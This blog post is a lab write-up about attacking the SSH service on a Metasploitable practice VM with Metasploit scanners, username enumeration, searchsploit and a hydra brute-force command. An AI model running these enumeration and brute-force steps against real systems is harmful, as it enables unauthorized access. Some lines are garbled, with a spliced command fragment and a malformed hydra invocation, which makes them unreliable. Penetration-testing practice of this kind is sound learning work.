# More hacking!

This is a follow up of my last post on hacking that can be read [here](https://filimon-danopoulos.github.io/posts/2014-11-12_Metasploitable-1.html). 
This time I will try my hands on the next service running on port 22. During this exercise I searched the web a bit and found numerous guides
on how to hack the Metasploitable machine. Since I want the excitement of finding something my self I have not read any post on the subject and I will not do that either.
This means I might very well find sub-optimal solutions for some problems, deal with it!

## The target

I will again target the same Metasploitable VM under the exact same circumstances as last time.
Running on port 22 it has (from the previous `nmap` scan tar I saved to the file `target`):

22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)

## Hack away!

Since I have already scanned all the ports and know the version of the software I am targeting I have to find 
some kind of weakness to exploit.

### Scanning

A quick search in the Metasploit console gives me:

    msf > search ssh

    Matching Modules
    ================

       Name                                                        Disclosure Date  Rank       Description
       ----                                                        ---------------  ----       -----------
     auxiliary/dos/windows/ssh/sysax_sshd_kexchange              2013-03-17       normal     Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service
     auxiliary/fuzzers/ssh/ssh_kexinit_corrupt                                    normal     SSH Key Exchange Init Corruption
     auxiliary/fuzzers/ssh/ssh_version_15                                         normal     SSH 1.5 Version Fuzzer
     auxiliary/fuzzers/ssh/ssh_version_2                                          normal     SSH 2.0 Version Fuzzer
     auxiliary/fuzzers/ssh/ssh_version_corrupt                                    normal     SSH Version Corruption
     auxiliary/pro/apps/ssh_key                                                   normal     PRO: SSH Key Recycler
     auxiliary/pro/scanner/ssh/ssh_login_credential                               normal     SSH Public Key Login Scanner
     auxiliary/scanner/ssh/cerberus_sftp_enumusers               2014-05-27       normal     Cerberus FTP Server SFTP Username Enumeration
     auxiliary/scanner/ssh/ssh_enumusers                                          normal     SSH Username Enumeration
     auxiliary/scanner/ssh/ssh_identify_pubkeys                                   normal     SSH Public Key Acceptance Scanner
     auxiliary/scanner/ssh/ssh_login                                              normal     SSH Login Check Scanner
     auxiliary/scanner/ssh/ssh_login_pubkey                                       normal     SSH Public Key Login Scanner
     auxiliary/scanner/ssh/ssh_version                                            normal     SSH Version Scanner
     exploit/apple_ios/ssh/cydia_default_ssh                     2007-07-02       excellent  Apple iOS Default SSH Password Vulnerability
     exploit/linux/ssh/f5_bigip_known_privkey                    2012-06-11       excellent  F5 BIG-IP SSH Private Key Exposure
     exploit/linux/ssh/loadbalancerorg_enterprise_known_privkey  2014-03-17       excellent  Loadbalancer.org Enterprise VA SSH Private Key Exposure
     exploit/linux/ssh/quantum_dxi_known_privkey                 2014-03-17       excellent  Quantum DXi V1000 SSH Private Key Exposure
     exploit/linux/ssh/quantum_vmpro_backdoor                    2014-03-17       excellent  Quantum vmPRO Backdoor Command
     exploit/linux/ssh/symantec_smg_ssh                          2012-08-27       excellent  Symantec Messaging Gateway 9.5 Default SSH Password Vulnerability
     exploit/multi/http/gitlab_shell_exec                        2013-11-04       excellent  Gitlab-shell Code Execution
     exploit/multi/ssh/sshexec                                   1999-01-01       manual     SSH User Code Execution
     exploit/unix/ssh/array_vxag_vapv_privkey_privesc            2014-02-03       excellent  Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution
     exploit/unix/ssh/tectia_passwd_changereq                    2012-12-01       excellent  Tectia SSH USERAUTH Change Request Password Reset Vulnerability
     exploit/windows/local/trusted_service_path                  2001-10-25       excellent  Windows Service Trusted Path Privilege Escalation
     exploit/windows/ssh/freeftpd_key_exchange                   2006-05-12       average    FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow
     exploit/windows/ssh/freesshd_authbypass                     2010-08-11       excellent  Freesshd Authentication Bypass
     exploit/windows/ssh/freesshd_key_exchange                   2006-05-12       average    FreeSSHd 1.0.9 Key Exchange Algorithm String Buffer Overflow
     exploit/windows/ssh/putty_msg_debug                         2002-12-16       normal     PuTTY Buffer Overflow
     exploit/windows/ssh/securecrt_ssh1                          2002-07-23       average    SecureCRT SSH1 Buffer Overflow
     exploit/windows/ssh/sysax_ssh_username                      2012-02-27       normal     Sysax 5.53 SSH Username Buffer Overflow
     post/linux/gather/enum_network                                               normal     Linux Gather Network Information
     post/multi/gather/ssh_creds                                                  normal     Multi Gather OpenSSH PKI Credentials Collection
     post/windows/gather/credentials/mremote                                      normal     Windows Gather mRemote Saved Password Extraction

This is a lot to take in and at first glance nothing seems applicable as a quick exploit. So instead of wasting time going through everything
I decided to only run `auxiliary/scanner/ssh/ssh_version` in order to verify that the version I found earlier is valid.

    msf > use auxiliary/scanner/ssh/ssh_version  
    msf auxiliary(ssh_version) > show options

    Module options (auxiliary/scanner/ssh/ssh_version):

       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       RHOSTS                    yes       The target address range or CIDR identifier
       RPORT    22               yes       The target port
       THREADS  1                yes       The number of concurrent threads
       TIMEOUT  30               yes       Timeout for the SSH probe

    msf auxiliary(ssh_version) > set RHOSTS 192.168.56.103
    RHOSTS => 192.168.56.103
    msf auxiliary(ssh_version) > run

    [*] 192.168.56.103:22, SSH server version: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    
This verifies the version. Let's go to the next step!

### Searching

Nothing fruit full yet so I turn to the next tool, `searchsploit`.

    # searchsploit openssh
     Description                                                                         Path
    ---------------------------------------------------------------------------------- ----------------------------------
    OpenSSH/PAM <= 3.6.1p1 Remote Users Discovery Tool                                | /linux/remote/25.c
    OpenSSH/PAM <= 3.6.1p1 Remote Users Ident (gossh.sh)                              | /linux/remote/26.sh
    glibc-2.2 and openssh-2.3.0p1 exploits glibc => 2.1.9x                            | /linux/local/258.sh
    Dropbear / OpenSSH Server (MAX_UNAUTH_CLIENTS) Denial of Service                  | /multiple/dos/1572.pl
    OpenSSH <= 4.3 p1 (Duplicated Block) Remote Denial of Service Exploit             | /multiple/dos/2444.sh
    Portable OpenSSH <= 3.6.1p-PAM / 4.1-SUSE Timing Attack Exploit                   | /multiple/remote/3303.sh
    Debian OpenSSH Remote SELinux Privilege Elevation Exploit (auth)                  | /linux/remote/6094.txt
    Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                | /novell/dos/14866.txt
    FreeBSD OpenSSH 3.5p1 - Remote Root Exploit                                       | /freebsd/remote/17462.txt
    OpenSSH 1.2 scp File Create/Overwrite Vulnerability                               | /linux/remote/20253.sh
    OpenSSH 2.x/3.0.1/3.0.2 Channel Code Off-By-One Vulnerability                     | /unix/remote/21314.txt
    OpenSSH 2.x/3.x Kerberos 4 TGT/AFS Token Buffer Overflow Vulnerability            | /linux/remote/21402.txt
    OpenSSH 3.x Challenge-Response Buffer Overflow Vulnerabilities (1)                | /unix/remote/21578.txt
    OpenSSH 3.x Challenge-Response Buffer Overflow Vulnerabilities (2)                | /unix/remote/21579.txt

Again nothing that seems directly applicable so I scrap the idea of finding an exploit manually. 
At this stage I would apply a vulnerability scanner but I couldn't get openvas to function correctly and couldn't be bothered
to figure out how to set it up correctly so I decided to try a common SSH vulnerability. Brute-forcing!

### Brute-forcing

I glance over the result from the metasploit search I did earlier to find something that would help with the brute forcing and see `auxiliary/scanner/ssh/ssh_enumusers`.
Having a set of valid users will really help speed up the brute forcing so I check if it is applicable (edited for brevity):

    msf > info auxiliary/scanner/ssh/ssh_enumusers 

    Name: SSH Username Enumeration
    Module: auxiliary/scanner/ssh/ssh_enumusers
    License: Metasploit Framework License (BSD)
    Rank: Normal

    Description:
      This module uses a time-based attack to enumerate users on an 
      OpenSSH server. On some versions of OpenSSH under some 
      configurations, OpenSSH will return a "permission denied" error for 
      an invalid user faster than for a valid user.

    References:
      http://cvedetails.com/cve/2006-5229/
      http://www.osvdb.org/32721
      http://www.securityfocus.com/bid/20418


This doesn't tell me the affected version I check the security focus [link](http://www.securityfocus.com/bid/20418) found under references. 
One of the affected versions is the one are running, sweet!

    msf > use auxiliary/scanner/ssh/ssh_enumusers 
    msf auxiliary(ssh_enumusers) > show options

    Module options (auxiliary/scanner/ssh/ssh_enumusers):

       Name       Current Setting  Required  Description
       ----       ---------------  --------  -----------
       Proxies                     no        Use a proxy chain
       RHOSTS                      yes       The target address range or CIDR identifier
       RPORT      22               yes       The target port
       THREADS    1                yes       The number of concurrent threads
       THRESHOLD  10               yes       Amount of seconds needed before a user is considered found
       USER_FILE                   yes       File containing usernames, one per line

    msf auxiliary(ssh_enumusers) > set RHOSTS 192.168.56.103
    RHOSTS => 192.168.56.103
    msf auxiliary(ssh_enumusers) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt                set USER_FILE ./usr/share/metasploit-framework/data/wordlists/default_users_for_servi
    USER_FILE => /usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt
    msf auxiliary(ssh_enumusers) > run

    [*] 192.168.56.103:22 - SSH - Checking for false positives
    [*] 192.168.56.103:22 - SSH - Starting scan

After running this for a while I decided to stop the scan, it's super slow and will probably not speed up the overall process much.


The number one tool for brute/root/Desktop/password.lst -vV 192.168.1.1 ftpforcing is probably `hydra ` so I will launch a bruteforce attack with it:

    # hydra -l -P /usr/share/john/password.lst -vV 192.168.56.103 ssh 
